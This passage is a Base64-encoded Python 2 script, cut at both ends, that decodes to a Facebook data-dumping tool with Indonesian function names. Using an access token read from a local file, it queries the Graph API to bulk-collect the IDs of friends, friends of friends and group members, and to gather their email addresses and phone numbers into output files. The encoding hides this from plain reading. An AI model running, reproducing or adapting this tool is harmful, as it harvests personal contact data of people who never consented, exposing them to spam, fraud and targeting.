zNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKICAgIG1lbnUoKQogICAgCiMjIyMjIERVTVAgIyMjIyMKZGVmIGR1bXAoKToKICBvcy5zeXN0ZW0oJ3Jlc2V0JykKICB0cnk6CiAgICB0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCiAgZXhjZXB0IElPRXJyb3I6CiAgICBwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKICAgIG9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCiAgICB0aW1lLnNsZWVwKDEpCiAgICBsb2dpbigpCiAgb3Muc3lzdGVtKCdyZXNldCcpCiAgcHJpbnQgbG9nbwogIHByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMS5cMDMzWzE7OTdtIEdldCBJRCBmcmllbmQiCiAgcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0yLlwwMzNbMTs5N20gR2V0IElEIGZyaWVuZCBmcm9tIGZyaWVuZCIKICBwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTMuXDAzM1sxOzk3bSBHZXQgSUQgU2VhcmNoIgogIHByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtNC5cMDMzWzE7OTdtIEdldCBncm91cCBtZW1iZXIgSUQiCiAgcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm01LlwwMzNbMTs5N20gR2V0IGdyb3VwIG1lbWJlciBlbWFpbCIKICBwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTYuXDAzM1sxOzk3bSBHZXQgZ3JvdXAgbWVtYmVyIHBob25lIG51bWJlciIKICBwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTcuXDAzM1sxOzk3bSBHZXQgZW1haWwgZnJpZW5kIgogIHByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtOC5cMDMzWzE7OTdtIEdldCBlbWFpbCBmcmllbmQgZnJvbSBmcmllbmQiCiAgcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm05LlwwMzNbMTs5N20gR2V0IGEgZnJpZW5kJ3MgcGhvbmUgbnVtYmVyIgogIHByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMTAuXDAzM1sxOzk3bSBHZXQgYSBmcmllbmQncyBwaG9uZSBudW1iZXIgZnJvbSBmcmllbmQiCiAgcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5MW0wLlwwMzNbMTs5N20gQmFjayIKICBwcmludCAi4pWRIgogIGR1bXBfcGlsaWgoKQojLS0tLS1waWxpaApkZWYgZHVtcF9waWxpaCgpOgogIGN1aWggPSByYXdfaW5wdXQoIlwwMzNbMTs5N23ilZrilZBcMDMzWzE7OTFtRCBcMDMzWzE7OTdtIikKICBpZiBjdWloID09IiI6CiAgICBwcmludCAiXDAzM1sxOzkxbVshXSBXcm9uZyBpbnB1dCIKICAgIGR1bXBfcGlsaWgoKQogIGVsaWYgY3VpaCA9PSIxIjoKICAgIGlkX3RlbWFuKCkKICBlbGlmIGN1aWggPT0iMiI6CiAgICBpZGZyb21fdGVtYW4oKQogIGVsaWYgY3VpaCA9PSIzIjoKICAgIG9zLnN5c3RlbSgncmVzZXQnKQogICAgcHJpbnQgIlwwMzNbMTs5MW1TZWdlcmEiCiAgICBrZWx1YXIoKQogIGVsaWYgY3VpaCA9PSI0IjoKICAgIGlkX21lbWJlcl9ncnVwKCkKICBlbGlmIGN1aWggPT0iNSI6CiAgICBlbV9tZW1iZXJfZ3J1cCgpCiAgZWxpZiBjdWloID09IjYiOgogICAgbm9fbWVtYmVyX2dydXAoKQogIGVsaWYgY3VpaCA9PSI3IjoKICAgIGVtYWlsKCkKICBlbGlmIGN1aWggPT0iOCI6CiAgICBlbWFpbGZyb21fdGVtYW4oKQogIGVsaWYgY3VpaCA9PSI5IjoKICAgIG5vbW9yX2hwKCkKICBlbGlmIGN1aWggPT0iMTAiOgogICAgaHBmcm9tX3RlbWFuKCkKICBlbGlmIGN1aWggPT0iMCI6CiAgICBtZW51KCkKICBlbHNlOgogICAgcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmcgaW5wdXQiCiAgICBkdW1wX3BpbGloKCkKICAgIAojIyMjIyBJRCBURU1BTiAjIyMjIwpkZWYgaWRfdGVtYW4oKToKICBvcy5zeXN0ZW0oJ3Jlc2V0JykKICB0cnk6CiAgICB0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCiAgZXhjZXB0IElPRXJyb3I6CiAgICBwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKICAgIG9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCiAgICB0aW1lLnNsZWVwKDEpCiAgICBsb2dpbigpCiAgdHJ5OgogICAgb3MubWtkaXIoJ291dCcpCiAgZXhjZXB0IE9TRXJyb3I6CiAgICBwYXNzCiAgdHJ5OgogICAgb3Muc3lzdGVtKCdyZXNldCcpCiAgICBwcmludCBsb2dvCiAgICByPXJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWUvZnJpZW5kcz9hY2Nlc3NfdG9rZW49Iit0b2tldCkKICAgIHo9anNvbi5sb2FkcyhyLnRleHQpCiAgICBqYWxhbignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1HZXQgYWxsIGZyaWVuZCBpZCBcMDMzWzE7OTdtLi4uJykKICAgIHByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgogICAgYnogPSBvcGVuKCdvdXQvaWRfdGVtYW4udHh0JywndycpCiAgICBmb3IgYSBpbiB6WydkYXRhJ106CiAgICAgIGlkdGVtYW4uYXBwZW5kKGFbJ2lkJ10pCiAgICAgIGJ6LndyaXRlKGFbJ2lkJ10gKyAnXG4nKQogICAgICBwcmludCAoIlxyXDAzM1sxOzk3bVsgXDAzM1sxOzkybSIrc3RyKGxlbihpZHRlbWFuKSkrIlwwMzNbMTs5N20gXVwwMzNbMTs5N209PiBcMDMzWzE7OTdtIithWydpZCddKSw7c3lzLnN0ZG91dC5mbHVzaCgpO3RpbWUuc2xlZXAoMC4wMDAxKQogICAgYnouY2xvc2UoKQogICAgcHJpbnQgJ1xyXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybVN1Y2Nlc3NmdWxseSBnZXQgaWQgXDAzM1sxOzk3bS4uLi4nCiAgICBwcmludCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVRvdGFsIElEIFwwMzNbMTs5MW06IFwwMzNbMTs5N20lcyIlKGxlbihpZHRlbWFuKSkKICAgIGRvbmUgPSByYXdfaW5wdXQoIlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtU2F2ZSBmaWxlIHdpdGggbmFtZVwwMzNbMTs5MW0gOlwwMzNbMTs5N20gIikKICAgIG9zLnJlbmFtZSgnb3V0L2lkX3RlbWFuLnR4dCcsJ291dC8nK2RvbmUpCiAgICBwcmludCgiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1GaWxlIHNhdmVkIFwwMzNbMTs5MW06IFwwMzNbMTs5N21vdXQvIitkb25lKQogICAgcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKICAgIGR1bXAoKQogIGV4Y2VwdCBJT0Vycm9yOgogICAgcHJpbnQiXDAzM1sxOzkxbVshXSBFcnJvciBjcmVhdGluZyBmaWxlIgogICAgcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKICAgIGR1bXAoKQogIGV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsRU9GRXJyb3IpOgogICAgcHJpbnQoIlwwMzNbMTs5MW1bIV0gU3RvcHBlZCIpCiAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgZHVtcCgpCiAgZXhjZXB0IEtleUVycm9yOgogICAgcHJpbnQoJ1wwMzNbMTs5MW1bIV0gRXJyb3InKQogICAgcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKICAgIGR1bXAoKQogIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKICAgIHByaW50IlwwMzNbMTs5MW1b4pyWXSBObyBjb25uZWN0aW9uIgogICAga2VsdWFyKCkKCiMjIyMjIElEIEZST00gVEVNQU4gIyMjIyMKZGVmIGlkZnJvbV90ZW1hbigpOgogIG9zLnN5c3RlbSgncmVzZXQnKQogIHRyeToKICAgIHRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKICBleGNlcHQgSU9FcnJvcjoKICAgIHByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgogICAgb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKICAgIHRpbWUuc2xlZXAoMSkKICAgIGxvZ2luKCkKICB0cnk6CiAgICBvcy5ta2Rpcignb3V0JykKICBleGNlcHQgT1NFcnJvcjoKICAgIHBhc3MKICB0cnk6CiAgICBvcy5zeXN0ZW0oJ3Jlc2V0JykKICAgIHByaW50IGxvZ28KICAgIGlkdCA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtSW5wdXQgSUQgZnJpZW5kIFwwMzNbMTs5MW06IFwwMzNbMTs5N20iKQogICAgdHJ5OgogICAgICBqb2sgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraWR0KyI/YWNjZXNzX3Rva2VuPSIrdG9rZXQpCiAgICAgIG9wID0ganNvbi5sb2Fkcyhqb2sudGV4dCkKICAgICAgcHJpbnQiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybUZyb21cMDMzWzE7OTFtIDpcMDMzWzE7OTdtICIrb3BbIm5hbWUiXQogICAgZXhjZXB0IEtleUVycm9yOgogICAgICBwcmludCJcMDMzWzE7OTFtWyFdIEZyaWVuZCBub3QgZm91bmQiCiAgICAgIHJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCiAgICAgIGR1bXAoKQogICAgcj1yZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraWR0KyI/ZmllbGRzPWZyaWVuZHMubGltaXQoNTAwMCkmYWNjZXNzX3Rva2VuPSIrdG9rZXQpCiAgICB6PWpzb24ubG9hZHMoci50ZXh0KQogICAgamFsYW4oJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtR2V0IGFsbCBmcmllbmQgaWQgZnJvbSBmcmllbmQgXDAzM1sxOzk3bS4uLicpCiAgICBwcmludCA0MioiXDAzM1sxOzk3beKVkCIKICAgIGJ6ID0gb3Blbignb3V0L2lkX3RlbWFuX2Zyb21fdGVtYW4udHh0JywndycpCiAgICBmb3IgYSBpbiB6WydmcmllbmRzJ11bJ2RhdGEnXToKICAgICAgaWRmcm9tdGVtYW4uYXBwZW5kKGFbJ2lkJ10pCiAgICAgIGJ6LndyaXRlKGFbJ2lkJ10gKyAnXG4nKQogICAgICBwcmludCAoIlxyXDAzM1sxOzk3bVsgXDAzM1sxOzkybSIrc3RyKGxlbihpZGZyb210ZW1hbikpKyJcMDMzWzE7OTdtIF1cMDMzWzE7OTdtPT4gXDAzM1sxOzk3bSIrYVsnaWQnXSksO3N5cy5zdGRvdXQuZmx1c2goKTt0aW1lLnNsZWVwKDAuMDAwMSkKICAgIGJ6LmNsb3NlKCkKICAgIHByaW50ICdcclwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1TdWNjZXNzZnVsbHkgZ2V0IGlkIFwwMzNbMTs5N20uLi4uJwogICAgcHJpbnQiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Ub3RhbCBJRCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtJXMiJShsZW4oaWRmcm9tdGVtYW4pKQogICAgZG9uZSA9IHJhd19pbnB1dCgiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1TYXZlIGZpbGUgd2l0aCBuYW1lXDAzM1sxOzkxbSA6XDAzM1sxOzk3bSAiKQogICAgb3MucmVuYW1lKCdvdXQvaWRfdGVtYW5fZnJvbV90ZW1hbi50eHQnLCdvdXQvJytkb25lKQogICAgcHJpbnQoIlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRmlsZSBzYXZlZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtb3V0LyIrZG9uZSkKICAgIHJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCiAgICBkdW1wKCkKICBleGNlcHQgSU9FcnJvcjoKICAgIHByaW50IlwwMzNbMTs5MW1bIV0gRXJyb3IgY3JlYXRpbmcgZmlsZSIKICAgIHJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCiAgICBkdW1wKCkKICBleGNlcHQgKEtleWJvYXJkSW50ZXJydXB0LEVPRkVycm9yKToKICAgIHByaW50KCJcMDMzWzE7OTFtWyFdIFN0b3BwZWQiKQogICAgcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKICAgIGR1bXAoKQogIGV4Y2VwdCBLZXlFcnJvcjoKICAgIHByaW50KCdcMDMzWzE7OTFtWyFdIEVycm9yJykKICAgIHJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCiAgICBkdW1wKCkKICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6CiAgICBwcmludCJcMDMzWzE7OTFtW+Kcll0gTm8gY29ubmVjdGlvbiIKICAgIGtlbHVhcigpCgojIyMjIyBJRCBGUk9NIE1FTUJFUiBHUlVQICMjIyMjCmRlZiBpZF9tZW1iZXJfZ3J1cCgpOgogIHRyeToKICAgIHRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKICBleGNlcHQgSU9FcnJvcjoKICAgIHByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgogICAgb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKICAgIHRpbWUuc2xlZXAoMSkKICAgIGxvZ2luKCkKICB0cnk6CiAgICBvcy5ta2Rpcignb3V0JykKICBleGNlcHQgT1NFcnJvcjoKICAgIHBhc3MKICB0cnk6CiAgICBvcy5zeXN0ZW0oJ3Jlc2V0JykKICAgIHByaW50IGxvZ28KICAgIGlkPXJhd19pbnB1dCgnXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtSW5wdXQgSUQgZ3JvdXAgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICcpCiAgICB0cnk6CiAgICAgIHI9cmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9ncm91cC8/aWQ9JytpZCsnJmFjY2Vzc190b2tlbj0nK3Rva2V0KQogICAgICBhc3c9anNvbi5sb2FkcyhyLnRleHQpCiAgICAgIHByaW50IlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Gcm9tIGdyb3VwIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAiK2Fzd1snbmFtZSddCiAgICBleGNlcHQgS2V5RXJyb3I6CiAgICAgIHByaW50IlwwMzNbMTs5MW1bIV0gR3JvdXAgbm90IGZvdW5kIgogICAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgICBkdW1wKCkKICAgIGphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybUdldCBncm91cCBtZW1iZXIgaWQgXDAzM1sxOzk3bS4uLicpCiAgICBwcmludCA0MioiXDAzM1sxOzk3beKVkCIKICAgIGJ6ID0gb3Blbignb3V0L21lbWJlcl9ncnVwLnR4dCcsJ3cnKQogICAgcmU9cmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8nK2lkKycvbWVtYmVycz9maWVsZHM9bmFtZSxpZCZsaW1pdD05OTk5OTk5OTkmYWNjZXNzX3Rva2VuPScrdG9rZXQpCiAgICBzPWpzb24ubG9hZHMocmUudGV4dCkKICAgIGZvciBhIGluIHNbJ2RhdGEnXToKICAgICAgaWRtZW0uYXBwZW5kKGFbJ2lkJ10pCiAgICAgIGJ6LndyaXRlKGFbJ2lkJ10gKyAnXG4nKQogICAgICBwcmludCAoIlxyXDAzM1sxOzk3bVsgXDAzM1sxOzkybSIrc3RyKGxlbihpZG1lbSkpKyJcMDMzWzE7OTdtIF1cMDMzWzE7OTdtPT4gXDAzM1sxOzk3bSIrYVsnaWQnXSksO3N5cy5zdGRvdXQuZmx1c2goKTt0aW1lLnNsZWVwKDAuMDAwMSkKICAgIGJ6LmNsb3NlKCkKICAgIHByaW50ICdcclwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1TdWNjZXNzZnVsbHkgZ2V0IGlkIFwwMzNbMTs5N20uLi4uJwogICAgcHJpbnQiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Ub3RhbCBJRCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtJXMiJShsZW4oaWRtZW0pKQogICAgZG9uZSA9IHJhd19pbnB1dCgiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1TYXZlIGZpbGUgd2l0aCBuYW1lXDAzM1sxOzkxbSA6XDAzM1sxOzk3bSAiKQogICAgb3MucmVuYW1lKCdvdXQvbWVtYmVyX2dydXAudHh0Jywnb3V0LycrZG9uZSkKICAgIHByaW50KCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZpbGUgc2F2ZWQgXDAzM1sxOzkxbTogXDAzM1sxOzk3bW91dC8iK2RvbmUpCiAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgZHVtcCgpCiAgZXhjZXB0IElPRXJyb3I6CiAgICBwcmludCJcMDMzWzE7OTFtWyFdIEVycm9yIGNyZWF0aW5nIGZpbGUiCiAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgZHVtcCgpCiAgZXhjZXB0IChLZXlib2FyZEludGVycnVwdCxFT0ZFcnJvcik6CiAgICBwcmludCgiXDAzM1sxOzkxbVshXSBTdG9wcGVkIikKICAgIHJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCiAgICBkdW1wKCkKICBleGNlcHQgS2V5RXJyb3I6CiAgICBwcmludCgnXDAzM1sxOzkxbVshXSBFcnJvcicpCiAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgZHVtcCgpCiAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgogICAgcHJpbnQiXDAzM1sxOzkxbVvinJZdIE5vIGNvbm5lY3Rpb24iCiAgICBrZWx1YXIoKQogICAgCiMjIyMjIEVNQUlMIEZST00gR1JVUCAjIyMjIwpkZWYgZW1fbWVtYmVyX2dydXAoKToKICB0cnk6CiAgICB0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCiAgZXhjZXB0IElPRXJyb3I6CiAgICBwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKICAgIG9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCiAgICB0aW1lLnNsZWVwKDEpCiAgICBsb2dpbigpCiAgdHJ5OgogICAgb3MubWtkaXIoJ291dCcpCiAgZXhjZXB0IE9TRXJyb3I6CiAgICBwYXNzCiAgdHJ5OgogICAgb3Muc3lzdGVtKCdyZXNldCcpCiAgICBwcmludCBsb2dvCiAgICBpZD1yYXdfaW5wdXQoJ1wwMzNbMTs5MW1bK10gXDAzM1sxOzkybUlucHV0IElEIGdyb3VwIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAnKQogICAgdHJ5OgogICAgICByPXJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vZ3JvdXAvP2lkPScraWQrJyZhY2Nlc3NfdG9rZW49Jyt0b2tldCkKICAgICAgYXN3PWpzb24ubG9hZHMoci50ZXh0KQogICAgICBwcmludCJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtRnJvbSBncm91cCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIithc3dbJ25hbWUnXQogICAgZXhjZXB0IEtleUVycm9yOgogICAgICBwcmludCJcMDMzWzE7OTFtWyFdIEdyb3VwIG5vdCBmb3VuZCIKICAgICAgcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKICAgICAgZHVtcCgpCiAgICBqYWxhbignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1HZXQgZ3JvdXAgbWVtYmVyIGVtYWlsIFwwMzNbMTs5N20uLi4nKQogICAgcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCiAgICBieiA9IG9wZW4oJ291dC9lbV9tZW1iZXJfZ3J1cC50eHQnLCd3JykKICAgIHJlPXJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJytpZCsnL21lbWJlcnM/ZmllbGRzPW5hbWUsaWQmbGltaXQ9OTk5OTk5OTk5JmFjY2Vzc190b2tlbj0nK3Rva2V0KQogICAgcz1qc29uLmxvYWRzKHJlLnRleHQpCiAgICBmb3IgYSBpbiBzWydkYXRhJ106CiAgICAgIHggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIrYVsnaWQnXSsiP2FjY2Vzc190b2tlbj0iK3Rva2V0KQogICAgICB6ID0ganNvbi5sb2Fkcyh4LnRleHQpCiAgICAgIHRyeToKICAgICAgICBlbW1lbS5hcHBlbmQoelsnZW1haWwnXSkKICAgICAgICBiei53cml0ZSh6WydlbWFpbCddICsgJ1xuJykKICAgICAgICBwcmludCAoIlxyXDAzM1sxOzk3bVsgXDAzM1sxOzkybSIrc3RyKGxlbihlbW1lbSkpKyJcMDMzWzE7OTdtIF1cMDMzWzE7OTdtPT4gXDAzM1sxOzk3bSIrelsnZW1haWwnXSsiIHwgIit6WyduYW1lJ10rIlxuIiksO3N5cy5zdGRvdXQuZmx1c2goKTt0aW1lLnNsZWVwKDAuMDAwMSkKICAgICAgZXhjZXB0IEtleUVycm9yOgogICAgICAgIHBhc3MKICAgIGJ6LmNsb3NlKCkKICAgIHByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgogICAgcHJpbnQgJ1xyXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybVN1Y2Nlc3NmdWxseSBnZXQgZW1haWwgZnJvbSBtZW1iZXIgZ3JvdXAgXDAzM1sxOzk3bS4uLi4nCiAgICBwcmludCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVRvdGFsIEVtYWlsIFwwMzNbMTs5MW06IFwwMzNbMTs5N20lcyIlKGxlbihlbW1lbSkpCiAgICBkb25lID0gcmF3X2lucHV0KCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVNhdmUgZmlsZSB3aXRoIG5hbWVcMDMzWzE7OTFtIDpcMDMzWzE7OTdtICIpCiAgICBvcy5yZW5hbWUoJ291dC9lbV9tZW1iZXJfZ3J1cC50eHQnLCdvdXQvJytkb25lKQogICAgcHJpbnQoIlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRmlsZSBzYXZlZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtb3V0LyIrZG9uZSkKICAgIHJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCiAgICBkdW1wKCkKICBleGNlcHQgSU9FcnJvcjoKICAgIHByaW50IlwwMzNbMTs5MW1bIV0gRXJyb3IgY3JlYXRpbmcgZmlsZSIKICAgIHJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCiAgICBkdW1wKCkKICBleGNlcHQgKEtleWJvYXJkSW50ZXJydXB0LEVPRkVycm9yKToKICAgIHByaW50KCJcMDMzWzE7OTFtWyFdIFN0b3BwZWQiKQogICAgcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKICAgIGR1bXAoKQogIGV4Y2VwdCBLZXlFcnJvcjoKICAgIHByaW50KCdcMDMzWzE7OTFtWyFdIEVycm9yJykKICAgIHJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCiAgICBkdW1wKCkKICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6CiAgICBwcmludCJcMDMzWzE7OTFtW+Kcll0gTm8gY29ubmVjdGlvbiIKICAgIGtlbHVhcigpCiAgICAKIyMjIyMgTk9NRVIgRlJPTSBHUlVQICMjIyMjCmRlZiBub19tZW1iZXJfZ3J1cCgpOgogIHRyeToKICAgIHRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKICBleGNlcHQgSU9FcnJvcjoKICAgIHByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgogICAgb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKICAgIHRpbWUuc2xlZXAoMSkKICAgIGxvZ2luKCkKICB0cnk6CiAgICBvcy5ta2Rpcignb3V0JykKICBleGNlcHQgT1NFcnJvcjoKICAgIHBhc3MKICB0cnk6CiAgICBvcy5zeXN0ZW0oJ3Jlc2V0JykKICAgIHByaW50IGxvZ28KICAgIGlkPXJhd19pbnB1dCgnXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtSW5wdXQgSUQgZ3JvdXAgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICcpCiAgICB0cnk6CiAgICAgIHI9cmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9ncm91cC8/aWQ9JytpZCsnJmFjY2Vzc190b2tlbj0nK3Rva2V0KQogICAgICBhc3c9anNvbi5sb2FkcyhyLnRleHQpCiAgICAgIHByaW50IlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Gcm9tIGdyb3VwIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAiK2Fzd1snbmFtZSddCiAgICBleGNlcHQgS2V5RXJyb3I6CiAgICAgIHByaW50IlwwMzNbMTs5MW1bIV0gR3JvdXAgbm90IGZvdW5kIgogICAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgICBkdW1wKCkKICAgIGphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybUdldCBncm91cCBtZW1iZXIgcGhvbmUgbnVtYmVyIFwwMzNbMTs5N20uLi4nKQogICAgcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCiAgICBieiA9IG9wZW4oJ291dC9ub19tZW1iZXJfZ3J1cC50eHQnLCd3JykKICAgIHJlPXJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJytpZCsnL21lbWJlcnM/ZmllbGRzPW5hbWUsaWQmbGltaXQ9OTk5OTk5OTk5JmFjY2Vzc190b2tlbj0nK3Rva2V0KQogICAgcz1qc29uLmxvYWRzKHJlLnRleHQpCiAgICBmb3IgYSBpbiBzWydkYXRhJ106CiAgICAgIHggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIrYV